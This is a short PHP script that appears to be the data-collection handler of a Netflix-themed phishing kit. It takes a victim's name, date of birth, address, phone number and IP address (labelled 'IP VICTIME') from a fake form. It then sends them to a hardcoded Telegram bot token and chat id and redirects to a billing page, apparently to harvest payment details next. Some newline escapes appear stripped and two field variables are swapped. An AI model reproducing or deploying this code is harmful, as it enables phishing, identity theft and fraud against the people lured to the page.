<?php

$pre = $_POST['firstname'];
$nom = $_POST['lastname'];
$dob = $_POST['dob'];
$add = $_POST['address'];
$ville = $_POST['zip'];
$zip = $_POST['city'];
$num = $_POST['phone'];
    
$ip = getenv("REMOTE_ADDR");


    $email = $_POST['mail'];
    $pass = $_POST['pass'];

        $tmsg = "---------- Netflix INFO=1 ---------nr";
        $tmsg .= "Prenom  : $pre n";
        $tmsg .= "Nom  : $nom n";
        $tmsg .= "DOB  : $dob n";
        $tmsg .= "Address  : $add n";
        $tmsg .= "Ville  : $ville n";
        $tmsg .= "Code postal  : $zip n";
        $tmsg .= "Numero  : $num n";
        $tmsg .= "IP VICTIME  : $ip n";
        $tmsg .= "--------------------------------------n";
        
                    file_get_contents("https://api.telegram.org/bot5438337714:AAEZN74LWgeLD-WfzjB4wTtFBcsqvnk4plA/sendMessage?chat_id=-856735443&text=" . urlencode($tmsg)."" );
 
        header("Location: ../billing2.php");
?>
